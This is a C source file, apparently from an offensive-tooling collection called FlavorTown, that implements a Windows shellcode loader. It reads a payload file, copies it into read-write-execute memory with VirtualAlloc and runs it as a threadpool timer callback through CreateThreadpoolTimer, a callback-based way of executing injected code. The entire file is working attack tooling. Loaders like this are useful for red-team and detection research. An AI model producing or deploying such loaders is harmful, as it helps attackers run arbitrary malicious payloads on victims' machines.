// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>

#include <stdio.h>
#include <windows.h>
#include <threadpoolapiset.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	ULARGE_INTEGER ulDueTime = { 0 };
	FILETIME sFiletime = { 0 };
	PTP_TIMER TPTimer = NULL;

	if (argc != 2)
	{
		printf("Usage: CreateThreadpoolTimer.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	// Set the timer to fire in one second.

	ulDueTime.QuadPart = (ULONGLONG) -(10000000); 

	sFiletime.dwLowDateTime = ulDueTime.LowPart;
	sFiletime.dwHighDateTime = ulDueTime.HighPart;

	TPTimer = CreateThreadpoolTimer((PTP_TIMER_CALLBACK)hAlloc, NULL, NULL);

	SetThreadpoolTimer(TPTimer, &sFiletime, 0, 0);

    // Delay for the timer to be fired
	Sleep(1500);
	
    WaitForThreadpoolTimerCallbacks(TPTimer, FALSE);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (TPTimer)
		CloseThreadpoolTimer(TPTimer);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}